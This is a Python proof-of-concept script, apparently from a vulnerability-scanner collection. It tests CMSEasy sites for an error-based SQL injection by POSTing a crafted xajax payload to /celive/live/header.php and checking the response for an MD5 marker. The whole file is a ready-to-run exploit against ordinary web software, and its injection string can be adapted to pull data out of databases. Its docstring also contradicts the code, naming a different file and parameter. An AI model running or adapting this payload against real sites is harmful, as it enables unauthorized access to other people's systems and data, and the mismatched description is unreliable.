
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: cmseasy header.php 报错注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0137013
author: Lucifer
description: 文件/coupon/s.php中,参数fids存在SQL注入。
'''
import sys
import json
import requests
import warnings
def run(url):
        result =['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "xajax":"Postdata",
            "xajaxargs[0]":"<xjxquery><q>detail=xxxxxx'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1=1,md5(1234)))),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)AND'1'='1</q></xjxquery>",
        }
        payload = "/celive/live/header.php"
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[1]='存在'
                result[0] = vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[1]='不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
